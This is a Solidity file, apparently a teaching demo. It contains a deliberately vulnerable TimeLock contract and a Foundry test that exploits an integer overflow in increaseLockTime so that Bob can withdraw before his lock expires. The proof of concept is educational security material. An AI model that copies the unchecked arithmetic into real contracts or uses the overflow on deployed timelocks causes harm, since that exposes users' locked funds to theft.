// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";

contract TimeLock {
    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseLockTime(uint _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient funds");
        require(
            block.timestamp > lockTime[msg.sender],
            "Lock time not expired"
        );

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract ContractTest is Test {
    TimeLock TimeLockContract;
    address alice;
    address bob;

    function setUp() public {
        TimeLockContract = new TimeLock();
        alice = vm.addr(1);
        bob = vm.addr(2);
        vm.deal(alice, 1 ether);
        vm.deal(bob, 1 ether);
    }

    function testCalculation() public {
        console.log("Alice balance", alice.balance);
        console.log("Bob balance", bob.balance);

        console.log("Alice deposit 1 Ether...");
        vm.prank(alice);
        TimeLockContract.deposit{value: 1 ether}();
        console.log("Alice balance", alice.balance);

        console.log("Bob deposit 1 Ether...");
        vm.startPrank(bob);
        TimeLockContract.deposit{value: 1 ether}();
        console.log("Bob balance", bob.balance);

        TimeLockContract.increaseLockTime(
            type(uint).max + 1 - TimeLockContract.lockTime(bob)
        );

        console.log(
            "Bob will successfully withdraw, because the lock time is calculate"
        );
        TimeLockContract.withdraw();
        console.log("Bob balance", bob.balance);
        vm.stopPrank();

        vm.prank(alice);
        console.log(
            "Alice will fail to withdraw, because the lock time did not expire"
        );
        TimeLockContract.withdraw(); // expect revert
    }
}